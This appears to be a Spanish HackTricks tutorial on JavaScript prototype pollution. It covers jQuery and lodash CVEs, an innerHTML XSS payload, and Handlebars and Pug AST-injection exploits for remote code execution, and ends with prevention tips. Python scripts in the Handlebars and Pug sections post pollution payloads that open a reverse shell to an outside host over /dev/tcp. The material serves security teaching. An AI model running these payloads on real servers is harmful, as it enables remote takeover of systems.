# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos en JavaScript <a href="#053a" id="053a"></a>

Primero que nada, necesitamos entender `Object` en JavaScript. Un objeto es simplemente una colecci√≥n de pares de clave y valor, a menudo llamados propiedades de ese objeto. Por ejemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

En Javascript, `Object` es un objeto b√°sico, la plantilla para todos los objetos reci√©n creados. Es posible crear un objeto vac√≠o pasando `null` a `Object.create`. Sin embargo, el objeto reci√©n creado tambi√©n tendr√° un tipo que corresponde al par√°metro pasado y hereda todas las propiedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente aprendimos que un Objeto en javascript es una colecci√≥n de claves y valores, por lo que tiene sentido que un objeto `null` sea solo un diccionario vac√≠o: `{}`

## Funciones / Clases en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, los conceptos de clase y funci√≥n est√°n bastante interrelacionados (la funci√≥n misma act√∫a como el constructor de la clase y la naturaleza real no tiene concepto de "clase" en javascript). Veamos el siguiente ejemplo:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
```markdown
![](<../../../.gitbook/assets/image (362).png>)

## Prototipos en JavaScript <a href="#3843" id="3843"></a>

Es importante notar que el atributo prototype puede ser cambiado/modificado/eliminado al ejecutar el c√≥digo. Por ejemplo, funciones a la clase pueden ser a√±adidas din√°micamente:

![](<../../../.gitbook/assets/image (363).png>)

Las funciones de la clase tambi√©n pueden ser modificadas (como `toString` o `valueOf` en los siguientes casos):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Herencia

En un programa basado en prototipos, los objetos heredan propiedades/m√©todos de clases. Las clases se derivan a√±adiendo propiedades/m√©todos a una instancia de otra clase o a√±adi√©ndolos a un objeto vac√≠o.

Nota que, si a√±ades una propiedad a un objeto que se usa como prototipo para un conjunto de objetos (como el myPersonObj), los objetos para los cuales es prototipo tambi√©n obtienen la nueva propiedad, pero esa propiedad no se imprime a menos que se llame espec√≠ficamente.

![](<../../../.gitbook/assets/image (366).png>)

## Contaminaci√≥n de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Ya deber√≠as haber aprendido que **cada objeto en JavaScript es simplemente una colecci√≥n de pares clave y valor** y que **cada objeto hereda del tipo Object en JavaScript**. Esto significa que si puedes contaminar el tipo Object **¬°cada objeto JavaScript del entorno va a estar contaminado!**

Esto es bastante simple, solo necesitas ser capaz de modificar algunas propiedades (pares clave-valor) de un objeto JavaScript arbitrario, porque como cada objeto hereda de Object, cada objeto puede acceder al esquema de Object.
```
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
Del ejemplo anterior es posible acceder a la estructura de Object utilizando las siguientes formas:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Entonces, como se mencion√≥ anteriormente, si ahora se agrega una propiedad al esquema Object, cada objeto JavaScript tendr√° acceso a la nueva propiedad:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
As√≠ que ahora cada objeto JS contendr√° las nuevas propiedades: la funci√≥n `printHello` y la nueva constante `globalconstant`

## contaminaci√≥n de prototipos

Esta t√©cnica no es tan efectiva como la anterior ya que no puedes contaminar el esquema del Objeto JS. Pero en casos donde la **palabra clave `__proto__` est√© prohibida, esta t√©cnica puede ser √∫til**.

Si puedes modificar las propiedades de una funci√≥n, puedes modificar la propiedad `prototype` de la funci√≥n y **cada nueva propiedad que a√±adas aqu√≠ ser√° heredada por cada objeto creado a partir de esa funci√≥n:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
En este caso, solo los **objetos creados a partir de la clase `person`** se ver√°n afectados, pero cada uno de ellos ahora **heredar√° las propiedades `sayHello` y `newConstant`**.

**Hay 2 maneras de abusar de la contaminaci√≥n de prototipos para envenenar CADA objeto de JS.**

La primera ser√≠a contaminar la propiedad prototype de **Object** (como se mencion√≥ antes, cada objeto de JS hereda de este):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si logras hacer eso, cada objeto JS podr√° ejecutar la funci√≥n `sayBye`.

La otra forma es envenenar el prototipo de un constructor de una variable de diccionario como en el siguiente ejemplo:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Despu√©s de ejecutar ese c√≥digo, **cada objeto JS podr√° ejecutar la funci√≥n `sayHey`**.

## Contaminando otros objetos

### De una clase a Object.prototype

En un escenario donde puedas **contaminar un objeto espec√≠fico** y necesites **llegar a `Object.prototype`**, puedes buscarlo con un c√≥digo como el siguiente:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Contaminaci√≥n de elementos de array

Ten en cuenta que, as√≠ como puedes contaminar atributos de objetos en JS, si tienes acceso para contaminar un array tambi√©n puedes **contaminar valores del array** accesibles **por √≠ndices** (ten en cuenta que no puedes sobrescribir valores, por lo que necesitas contaminar √≠ndices que de alguna manera se usen pero no se escriban).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Contaminaci√≥n de elementos HTML

Al generar un elemento HTML mediante JS, es posible **sobrescribir** el atributo **`innerHTML`** para hacer que escriba **c√≥digo HTML arbitrario.** [Idea y ejemplo de este informe](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ejemplos

### Ejemplo B√°sico

¬øD√≥nde ocurre la contaminaci√≥n del prototipo? Sucede cuando hay un error en la aplicaci√≥n que permite sobrescribir propiedades de `Object.prototype`. Dado que cada objeto t√≠pico hereda sus propiedades de `Object.prototype`, podemos cambiar el comportamiento de la aplicaci√≥n. El ejemplo m√°s com√∫nmente mostrado es el siguiente:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagina que tenemos una contaminaci√≥n de prototipos que hace posible establecer `Object.prototype.isAdmin = true`. Entonces, a menos que la aplicaci√≥n haya asignado expl√≠citamente alg√∫n valor, `user.isAdmin` ¬°siempre es verdadero!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Por ejemplo, `obj[a][b] = value`. Si el atacante puede controlar el valor de `a` y `value`, entonces solo necesita ajustar el valor de `a` a `__proto__` (en javascript, `obj["__proto__"]` y `obj.__proto__` son completamente equivalentes) entonces la propiedad `b` de todos los objetos existentes en la aplicaci√≥n se asignar√° a `value`.

Sin embargo, el ataque no es tan simple como el anterior, seg√∫n [paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), solo podemos atacar cuando se cumple una de las siguientes tres condiciones:

* Realizar una fusi√≥n recursiva
* Definici√≥n de propiedad por ruta
* Clonar objeto

### Sobrescribir funci√≥n
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution a RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Prototype pollution en cliente a XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de prototype pollution a trav√©s de jQuery $ .extend

$ .extend, si se maneja incorrectamente, puede cambiar las propiedades del objeto `prototype` (la plantilla de los objetos en la app). Este atributo aparecer√° luego en todos los objetos. Note que solo la versi√≥n "profunda" (es decir, g) de $ .extend est√° afectada.

Los programadores a menudo usan esta funci√≥n para duplicar un objeto o completar nuevas propiedades a partir de un objeto predeterminado. Por ejemplo:

Podemos imaginar que `myObject` es un campo de entrada del usuario y se serializa en la DB)

En este c√≥digo, a menudo pensamos que, al ejecutarse, asignar√° el atributo `isAdmin` al objeto reci√©n creado. Pero esencialmente, se asigna directamente a `{}` y luego `{}.isAdmin` ser√° `true`. Si despu√©s de este c√≥digo, realizamos la siguiente comprobaci√≥n:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
Si el usuario a√∫n no existe (`undefined`), la propiedad `isAdmin` se buscar√° en su objeto padre, que es el Objeto al que se le a√±adi√≥ `isAdmin` con el valor `true` arriba.

Otro ejemplo cuando se ejecuta en JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Estos errores pueden afectar a muchos proyectos de Javascript, especialmente a proyectos de NodeJS, el ejemplo m√°s pr√°ctico es el error en Mongoose, la biblioteca de JS que ayuda a manipular MongoDB, en diciembre de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de contaminaci√≥n de prototipos a trav√©s de lodash

[Lodash](https://www.npmjs.com/package/lodash) es tambi√©n una biblioteca conocida que proporciona muchas funciones diferentes, ayud√°ndonos a escribir c√≥digo de manera m√°s conveniente y ordenada con m√°s de 19 millones de descargas semanales. Y tuvo el mismo problema que JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este error afecta a todas las versiones de Lodash, ya corregido en la versi√≥n 4.17.11.

### Otro tutorial con CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Contaminaci√≥n de prototipos AST

En NodeJS, AST se usa en JS realmente a menudo, como motores de plantillas y typescript, etc.\
Para el motor de plantillas, la estructura se muestra arriba.

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

Informaci√≥n tomada de [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Puedes insertar cualquier cadena en `Object.prototype.pendingContent` para determinar la posibilidad de un ataque.\
Esto te permite estar seguro de que los servidores est√°n utilizando el motor handlebars cuando existe una contaminaci√≥n de prototipos en un entorno de caja negra.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
**Explotaci√≥n**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars funciona como se muestra en el gr√°fico anterior.

Despu√©s de que el lexer y el parser generan el AST, se pasa a `compiler.js`\
Podemos ejecutar la funci√≥n de plantilla que el compilador gener√≥ con algunos argumentos. y devuelve una cadena como "Hola posix" (cuando msg es posix)
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
El analizador en handlebars fuerza el valor de un nodo cuyo tipo es NumberLiteral para que siempre sea un n√∫mero a trav√©s del constructor Number. Sin embargo, puedes insertar una cadena no num√©rica aqu√≠ utilizando la contaminaci√≥n de prototipos.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
Primero, observa la funci√≥n compile, la cual soporta dos formas de entrada, Objeto AST y cadena de plantilla.

cuando input.type es un `Program`, aunque el valor de entrada es en realidad una cadena.\
El Parser considera que ya es un AST analizado por parser.js y lo env√≠a al compilador sin ning√∫n procesamiento.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
El compilador, dado el objeto AST (en realidad una cadena), lo env√≠a al m√©todo `accept`.\
y `accept` llama a `this[node.type]` del compilador.\
Luego toma el atributo body del AST y lo utiliza para construir la funci√≥n.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
Como resultado, un ataque puede configurarse de esta manera. Si has pasado por el analizador, especifica una cadena que no pueda asignarse al valor de NumberLiteral. Pero una vez procesado el AST inyectado, podemos insertar cualquier c√≥digo en la funci√≥n.

**Ejemplo**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

M√°s informaci√≥n en [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## ¬øQu√© puedo hacer para prevenir?

* Congelar propiedades con Object.freeze (Object.prototype)
* Realizar validaci√≥n en las entradas JSON de acuerdo con el esquema de la aplicaci√≥n
* Evitar el uso de funciones de fusi√≥n recursiva de manera insegura
* Usar objetos sin propiedades de prototipo, como `Object.create(null)`, para evitar afectar la cadena de prototipos
* Usar `Map` en lugar de `Object`
* Actualizar regularmente nuevos parches para bibliotecas

## Referencia

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
